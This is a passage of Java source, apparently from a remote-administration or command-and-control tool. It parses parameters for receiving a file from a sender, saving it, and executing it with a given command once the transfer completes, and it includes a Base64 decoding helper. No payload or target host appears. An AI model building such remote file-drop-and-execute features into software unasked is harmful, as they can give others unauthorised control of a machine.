			}catch(Exception e){}
			
			//assign list to use
			if(par_SPLINTER != null)
			{
				list_to_use = par_SPLINTER.list_file_receivers;
			}
			else if(par_CONTROLLER != null)
			{
				list_to_use = par_CONTROLLER.list_file_receivers;
			}
			
			String id = arguments[0].trim();
			String filePathOnSender = arguments[1].trim();
			String saveFleName = arguments[2].trim();
			String executionArguments = arguments[3].trim();
			String saveDir = arguments[4].trim();
			String fullExecutionCommand = arguments[5].trim();
			String executeFileWhenTransferComplete = arguments[6].trim();
									
			File_Receiver receiver = new File_Receiver(list_to_use, id, filePathOnSender, saveFleName, executionArguments, saveDir, fullExecutionCommand, executeFileWhenTransferComplete);
			
						
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("initialize_file_receiver", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	public static byte[] getBase64DecodedByteArray_From_Base64EncodedString(String msgToDecode)
	{
		try
		{
			//convert the byte array of the digest into a base64 encoded string
			byte [] arr = Base64.decode(msgToDecode);
			
			return arr;
			
		}
		catch(Exception e)
		{
			Driver.eop("getBase64EncodedText_From_ByteArray", "Driver", e, "", false);
		}
		
		return null;
	}

}
